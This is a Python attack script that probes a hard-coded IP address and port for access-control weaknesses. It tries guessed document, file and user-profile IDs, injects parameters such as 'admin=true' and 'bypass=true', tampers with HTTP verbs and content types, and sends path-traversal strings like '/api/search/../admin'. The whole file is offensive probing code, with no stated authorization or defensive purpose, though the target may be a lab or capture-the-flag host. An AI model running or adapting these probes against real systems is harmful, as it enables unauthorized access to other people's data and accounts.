#!/usr/bin/env python3
"""
Check for IDOR and access control issues
"""

import requests
import time

BASE_URL = "http://138.199.163.92:16969"

print("="*60)
print("Checking for IDOR and Access Control Issues")
print("="*60)

# 1. Try to access documents/files directly
print("\n[*] Trying direct document access...")

document_paths = [
    '/document/1',
    '/document/2',
    '/documents/1',
    '/documents/2',
    '/file/1',
    '/file/2',
    '/files/1',
    '/files/2',
    '/api/document/1',
    '/api/documents/1',
    '/api/file/1',
    '/api/files/1',
    '/download/1',
    '/download/2',
    '/api/download/1',
    '/vault/1',
    '/api/vault/1',
]

for path in document_paths:
    resp = requests.get(f"{BASE_URL}{path}", allow_redirects=False)
    if resp.status_code not in [404, 405, 401, 403]:
        print(f"  [+] {path}: {resp.status_code}")
        if len(resp.text) < 500:
            print(f"      {resp.text}")

# 2. Try to access user profiles
print("\n[*] Trying user profile access...")

user_paths = [
    '/user/1',
    '/user/admin',
    '/user/demo',
    '/users/1',
    '/profile/1',
    '/profile/admin',
    '/profile/demo',
    '/api/user/1',
    '/api/user/admin',
    '/api/user/demo',
    '/api/users/1',
    '/api/profile/1',
]

for path in user_paths:
    resp = requests.get(f"{BASE_URL}{path}", allow_redirects=False)
    if resp.status_code not in [404, 405, 401, 403]:
        print(f"  [+] {path}: {resp.status_code}")
        if len(resp.text) < 500:
            print(f"      {resp.text}")

# 3. Try parameter pollution on /api/search
print("\n[*] Trying parameter manipulation on /api/search...")

# Try with user_id or similar parameters
params_list = [
    {'user_id': '1'},
    {'user': 'admin'},
    {'user': 'demo'},
    {'id': '1'},
    {'document_id': '1'},
    {'bypass': 'true'},
    {'admin': 'true'},
    {'authenticated': 'true'},
    {'logged_in': 'true'},
]

for params in params_list:
    resp = requests.get(f"{BASE_URL}/api/search", params=params)
    if resp.status_code != 401:
        print(f"  [+] With {params}: {resp.status_code}")
        print(f"      {resp.text[:200]}")

# 4. Try HTTP verb tampering
print("\n[*] Trying HTTP verb tampering...")

for method in ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS', 'TRACE']:
    try:
        resp = requests.request(method, f"{BASE_URL}/api/search", timeout=3)
        if resp.status_code not in [401, 404, 405]:
            print(f"  [+] {method}: {resp.status_code} - {resp.text[:100]}")
    except:
        pass

# 5. Try accessing with different content types
print("\n[*] Trying different content types...")

content_types = [
    'application/json',
    'application/xml',
    'text/xml',
    'text/plain',
    'multipart/form-data',
]

for ct in content_types:
    headers = {'Content-Type': ct}
    resp = requests.get(f"{BASE_URL}/api/search", headers=headers)
    if resp.status_code != 401:
        print(f"  [+] Content-Type {ct}: {resp.status_code}")
        print(f"      {resp.text[:200]}")

# 6. Try path traversal on /api/search
print("\n[*] Trying path traversal...")

traversal_paths = [
    '/api/search/../admin',
    '/api/search/../../admin',
    '/api/search/../documents',
    '/api/search/../files',
    '/api/./search',
    '/api//search',
    '/api/search%2f..%2fadmin',
]

for path in traversal_paths:
    resp = requests.get(f"{BASE_URL}{path}", allow_redirects=False)
    if resp.status_code not in [404, 405, 401]:
        print(f"  [+] {path}: {resp.status_code}")
        print(f"      {resp.text[:200]}")

print("\n[*] Check complete!")
